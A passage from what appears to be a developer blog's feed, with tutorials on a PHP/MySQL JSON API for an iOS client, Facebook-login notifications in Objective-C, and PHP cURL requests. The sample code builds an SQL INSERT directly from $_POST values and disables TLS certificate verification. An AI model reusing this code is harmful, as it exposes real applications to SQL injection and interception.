class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mysql_connect</span>(localhost, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;database_name&#x27;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;SELECT * FROM user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$count</span> = <span class="title function_ invoke__">mysql_numrows</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// store the result in array form</span></span><br><span class="line"><span class="variable">$result_set</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$count</span>) &#123;</span><br><span class="line">    <span class="variable">$result_set</span>[<span class="variable">$i</span>] = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$result_set</span>[<span class="variable">$i</span>][<span class="string">&#x27;username&#x27;</span>] = <span class="title function_ invoke__">mysql_result</span>(<span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">    <span class="variable">$result_set</span>[<span class="variable">$i</span>][<span class="string">&#x27;first_name&#x27;</span>] = <span class="title function_ invoke__">mysql_result</span>(<span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&#x27;first_name&#x27;</span>);</span><br><span class="line">    <span class="variable">$result_set</span>[<span class="variable">$i</span>][<span class="string">&#x27;last_name&#x27;</span>] = <span class="title function_ invoke__">mysql_result</span>(<span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&#x27;last_name&#x27;</span>);</span><br><span class="line">    <span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$result_set</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the header to JSON</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><h4 id="Add-a-new-user"><a href="#Add-a-new-user" class="headerlink" title="Add a new user"></a>Add a new user</h4><p><code>POST http://api.yoursite.com/user/add</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// only process it if it is POST request</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO user VALUES (<span class="subst">$_POST</span>[&#x27;username&#x27;], <span class="subst">$_POST</span>[&#x27;first_name&#x27;], <span class="subst">$_POST</span>[&#x27;last_name&#x27;])&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;John Smith has been inserted&#x27;</span></span><br><span class="line">    ));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// if not POST, then return 404</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Endpoint not found&#x27;</span></span><br><span class="line">    ));</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 404 Not Found&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the header to JSON</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><h2 id="Client-side"><a href="#Client-side" class="headerlink" title="Client side"></a>Client side</h2><p>In this example will using this library - <a href="https://github.com/AFNetworking/AFNetworking">AFNetworking</a>. It has been simplify a lot of code from iOS SDK (or just call it as a wrapper)</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="string">&quot;AFNetworking.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BASE_URL @<span class="string">&quot;http://api.yoursite.com&quot;</span></span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="comment">/* Retrieve a list of users */</span></span><br><span class="line">- (<span class="type">void</span>)loadUserList</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="built_in">NSString</span> *relativePath = <span class="string">@&quot;/users&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">NSURL</span> *url = [<span class="built_in">NSURL</span> URLWithString:relativePath relativeToURL:[<span class="built_in">NSURL</span> URLWithString:BASE_URL]];</span><br><span class="line">    AFHTTPClient *httpClient = [[AFHTTPClient alloc] initWithBaseURL:url];</span><br><span class="line">    [httpClient setParameterEncoding:AFFormURLParameterEncoding];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">NSURLRequest</span> *request = [httpClient requestWithMethod:<span class="string">@&quot;GET&quot;</span></span><br><span class="line">                                                     path:relativePath</span><br><span class="line">                                               parameters:<span class="literal">nil</span>];</span><br><span class="line"></span><br><span class="line">    [[AFJSONRequestOperation JSONRequestOperationWithRequest:request success:^(<span class="built_in">NSURLRequest</span> *request, <span class="built_in">NSHTTPURLResponse</span> *response, <span class="type">id</span> json) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// success</span></span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Success %@&quot;</span>, json);</span><br><span class="line">        </span><br><span class="line">    &#125; failure:^(<span class="built_in">NSURLRequest</span> *request, <span class="built_in">NSHTTPURLResponse</span> *response, <span class="built_in">NSError</span> *error, <span class="type">id</span> json) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// failed</span></span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Failed %@&quot;</span>, json);</span><br><span class="line"></span><br><span class="line">    &#125;] start];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Add a new user */</span></span><br><span class="line">- (<span class="type">void</span>)addUser</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="built_in">NSString</span> *relativePath = <span class="string">@&quot;/user/add&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">NSURL</span> *url = [<span class="built_in">NSURL</span> URLWithString:relativePath relativeToURL:[<span class="built_in">NSURL</span> URLWithString:BASE_URL]];</span><br><span class="line">    AFHTTPClient *httpClient = [[AFHTTPClient alloc] initWithBaseURL:url];</span><br><span class="line">    [httpClient setParameterEncoding:AFFormURLParameterEncoding];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">NSURLRequest</span> *request = [httpClient requestWithMethod:<span class="string">@&quot;POST&quot;</span></span><br><span class="line">                                                     path:relativePath</span><br><span class="line">                                               parameters:[<span class="built_in">NSDictionary</span> dictionaryWithObjectsAndKeys:</span><br><span class="line">                                                             <span class="keyword">self</span>.usernameTextField.text, <span class="string">@&quot;username&quot;</span>,</span><br><span class="line">                                                             <span class="keyword">self</span>.firstNameTextField.text, <span class="string">@&quot;first_name&quot;</span>,</span><br><span class="line">                                                             <span class="keyword">self</span>.lastNameTextField.text, <span class="string">@&quot;last_name&quot;</span>,</span><br><span class="line">                                                            <span class="literal">nil</span>]];</span><br><span class="line"></span><br><span class="line">    [[AFJSONRequestOperation JSONRequestOperationWithRequest:request success:^(<span class="built_in">NSURLRequest</span> *request, <span class="built_in">NSHTTPURLResponse</span> *response, <span class="type">id</span> json) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// success</span></span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Success %@&quot;</span>, json);</span><br><span class="line">        </span><br><span class="line">    &#125; failure:^(<span class="built_in">NSURLRequest</span> *request, <span class="built_in">NSHTTPURLResponse</span> *response, <span class="built_in">NSError</span> *error, <span class="type">id</span> json) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// failed</span></span><br><span class="line">        <span class="built_in">NSLog</span>(<span class="string">@&quot;Failed %@&quot;</span>, json);</span><br><span class="line"></span><br><span class="line">    &#125;] start];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Simple :)</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I have few friends as me about this.&lt;/p&gt;
&lt;p&gt;– &lt;strong&gt;How iOS can retrieve/update from/to MySQL/MSSQL database?&lt;/strong&gt; –&lt;/p&gt;
&lt;p&gt;There</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Invoke a method call from AppDelegate via Notification</title>
    <link href="http://jslim.net/blog/2013/09/16/invoke-a-method-call-from-appdelegate-via-notification/"/>
    <id>http://jslim.net/blog/2013/09/16/invoke-a-method-call-from-appdelegate-via-notification/</id>
    <published>2013-09-16T04:12:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Think of a scenario here:</p><p>You have a class <strong>LoginViewController</strong>, while Facebook login api call is keep on <strong>AppDelegate.m</strong>, and you want to perform some action after success login via Facebook.</p><p>In <strong>AppDelegate.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)sessionStateChanged:(FBSession *)session state:(FBSessionState)state error:(<span class="built_in">NSError</span> *)error</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (state) &#123;</span><br><span class="line">        <span class="keyword">case</span> FBSessionStateOpen: &#123;</span><br><span class="line">            <span class="comment">// call the method and pass the accessToken to it</span></span><br><span class="line">            [[<span class="built_in">NSNotificationCenter</span> defaultCenter] postNotificationName:<span class="string">@&quot;PerformFacebookLogin&quot;</span> object:<span class="literal">nil</span> userInfo:[<span class="built_in">NSDictionary</span> dictionaryWithObjectsAndKeys:session.accessTokenData.accessToken, <span class="string">@&quot;fb_token&quot;</span>, <span class="literal">nil</span>]];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> FBSessionStateClosed:</span><br><span class="line">        <span class="keyword">case</span> FBSessionStateClosedLoginFailed:</span><br><span class="line">            <span class="comment">// Login failed or want to end the session</span></span><br><span class="line">            [FBSession.activeSession closeAndClearTokenInformation];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">        <span class="built_in">UIAlertView</span> *alertView = [[<span class="built_in">UIAlertView</span> alloc]</span><br><span class="line">                                  initWithTitle:<span class="string">@&quot;Facebook login failed&quot;</span></span><br><span class="line">                                  message:error.description</span><br><span class="line">                                  delegate:<span class="literal">nil</span></span><br><span class="line">                                  cancelButtonTitle:<span class="string">@&quot;OK&quot;</span></span><br><span class="line">                                  otherButtonTitles:<span class="literal">nil</span>];</span><br><span class="line">        [alertView show];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">void</span>)openSession</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSArray</span> *permissions = [<span class="built_in">NSArray</span> arrayWithObjects:</span><br><span class="line">                            <span class="string">@&quot;email&quot;</span>,</span><br><span class="line">                            <span class="string">@&quot;user_birthday&quot;</span>,</span><br><span class="line">                            <span class="literal">nil</span>];</span><br><span class="line">    [FBSession openActiveSessionWithReadPermissions:permissions</span><br><span class="line">                                       allowLoginUI:<span class="literal">YES</span></span><br><span class="line">                                  completionHandler:</span><br><span class="line">     ^(FBSession *session,</span><br><span class="line">       FBSessionState state, <span class="built_in">NSError</span> *error) &#123;</span><br><span class="line">         [<span class="keyword">self</span> sessionStateChanged:session state:state error:error];</span><br><span class="line">     &#125;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (<span class="type">BOOL</span>)application:(<span class="built_in">UIApplication</span> *)application openURL:(<span class="built_in">NSURL</span> *)url sourceApplication:(<span class="built_in">NSString</span> *)sourceApplication annotation:(<span class="type">id</span>)annotation</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> [FBSession.activeSession handleOpenURL:url];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In <strong>LoginViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">void</span>)viewDidLoad</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// listen to notification, then call facebookLogin method</span></span><br><span class="line">    [[<span class="built_in">NSNotificationCenter</span> defaultCenter] addObserver:<span class="keyword">self</span> selector:<span class="keyword">@selector</span>(facebookLogin:) name:<span class="string">@&quot;PerformFacebookLogin&quot;</span> object:<span class="literal">nil</span>];</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">- (<span class="type">void</span>)facebookLogin:(<span class="built_in">NSNotification</span> *)notification</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">NSDictionary</span> *userInfo = [notification userInfo];</span><br><span class="line">    <span class="built_in">NSString</span> *token = [userInfo valueForKey:<span class="string">@&quot;fb_token&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// do what you want after success login via Facebook</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>References:</p><ul><li><em><a href="http://stackoverflow.com/questions/18707531/access-current-view-from-appdelegate/18707599#18707599">Access current view from AppDelegate</a></em></li><li><em><a href="http://stackoverflow.com/questions/7896646/how-to-pass-object-with-nsnotificationcenter/7896761#7896761">How to pass object with NSNotificationCenter</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Think of a scenario here:&lt;/p&gt;
&lt;p&gt;You have a class &lt;strong&gt;LoginViewController&lt;/strong&gt;, while Facebook login api call is keep on</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Get JSON using PHP cURL from web service</title>
    <link href="http://jslim.net/blog/2013/09/12/get-json-using-php-curl-from-web-service/"/>
    <id>http://jslim.net/blog/2013/09/12/get-json-using-php-curl-from-web-service/</id>
    <published>2013-09-12T08:41:00.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>This example is to show how to detect user’s country</p><p>For <strong>GET</strong> request</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set HTTP header</span></span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;Content-Type: application/json&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// query string</span></span><br><span class="line"><span class="variable">$fields</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span> =&gt; <span class="string">&#x27;&lt;your_api_key&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;format&#x27;</span> =&gt; <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://api.ipinfodb.com/v3/ip-country?&#x27;</span> . <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$fields</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open connection</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the url, number of GET vars, GET data</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Execute request</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close connection</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the result and parse to JSON</span></span><br><span class="line"><span class="variable">$result_arr</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$result</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$result_arr</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  output:</span></span><br><span class="line"><span class="comment"> *  Array</span></span><br><span class="line"><span class="comment"> *  (</span></span><br><span class="line"><span class="comment"> *      [statusCode] =&gt; &quot;OK&quot;,</span></span><br><span class="line"><span class="comment"> *      [statusMessage] =&gt; &quot;&quot;,</span></span><br><span class="line"><span class="comment"> *      [ipAddress] =&gt; &quot;123.13.123.12&quot;,</span></span><br><span class="line"><span class="comment"> *      [countryCode] =&gt; &quot;MY&quot;,</span></span><br><span class="line"><span class="comment"> *      [countryName] =&gt; &quot;MALAYSIA&quot;,</span></span><br><span class="line"><span class="comment"> *  )</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>For <strong>POST</strong> request</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set HTTP header</span></span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;Content-Type: application/json&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set POST params</span></span><br><span class="line"><span class="variable">$fields</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span> =&gt; <span class="string">&#x27;&lt;your_api_key&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;format&#x27;</span> =&gt; <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">);</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://api.ipinfodb.com/v3/ip-country&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open connection</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set the url, number of POST vars, POST data</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span> );</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$fields</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Execute post</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close connection</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$result_arr</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$result</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>For <strong>POST</strong> request with binary body <em>(e.g. an audio wav file)</em></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$params = <span class="literal">[</span></span><br><span class="line"><span class="literal">    &#x27;<span class="identifier">qs1</span>&#x27; =&gt; &#x27;<span class="identifier">foo</span>&#x27;,</span></span><br><span class="line"><span class="literal">]</span>;</span><br><span class="line">$file = &#x27;/path/<span class="keyword">to</span>/file.wav&#x27;;</span><br><span class="line"></span><br><span class="line">$ch = curl<span class="constructor">_init()</span>;</span><br><span class="line">curl<span class="constructor">_setopt($<span class="params">ch</span>, CURLOPT_URL, $<span class="params">url</span> . &#x27;?&#x27; . <span class="params">http_build_query</span>($<span class="params">params</span>)</span>);</span><br><span class="line">curl<span class="constructor">_setopt($<span class="params">ch</span>, CURLOPT_PUT, 1)</span>;</span><br><span class="line">curl<span class="constructor">_setopt($<span class="params">ch</span>, CURLOPT_INFILESIZE, <span class="params">filesize</span>($<span class="params">file</span>)</span>);</span><br><span class="line">curl<span class="constructor">_setopt($<span class="params">ch</span>, CURLOPT_INFILE, ($<span class="params">in</span> = <span class="params">fopen</span>($<span class="params">file</span>, &#x27;<span class="params">r</span>&#x27;)</span>));</span><br><span class="line">curl<span class="constructor">_setopt($<span class="params">ch</span>, CURLOPT_CUSTOMREQUEST, &#x27;POST&#x27;)</span>;</span><br><span class="line"></span><br><span class="line">curl<span class="constructor">_setopt($<span class="params">ch</span>, CURLOPT_HTTPHEADER, $<span class="params">headers</span>)</span>;</span><br><span class="line">ob<span class="constructor">_start()</span>;</span><br><span class="line"><span class="keyword">if</span> (curl<span class="constructor">_exec($<span class="params">ch</span>)</span><span class="operator"> === </span><span class="literal">false</span>) &#123;</span><br><span class="line">    throw <span class="keyword">new</span> \<span class="constructor">Exception(&#x27;Curl <span class="params">error</span>: &#x27;. <span class="params">curl_error</span>($<span class="params">ch</span>)</span>);</span><br><span 